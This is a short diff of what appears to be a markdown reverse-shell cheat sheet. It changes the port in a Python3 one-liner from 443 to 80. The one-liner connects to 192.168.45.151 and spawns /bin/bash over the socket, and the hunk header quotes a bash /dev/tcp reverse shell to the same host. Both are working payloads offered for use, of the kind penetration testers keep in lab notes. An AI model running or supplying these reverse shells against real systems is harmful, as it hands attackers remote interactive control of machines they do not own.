@@ -38,7 +38,7 @@ sh -i >& /dev/tcp/192.168.45.151/443 0>&1
 
 ### Python3
 ```bash
-python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("192.168.45.151",443));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'
+python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("192.168.45.151",80));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'
 ```
 
 ### Python2
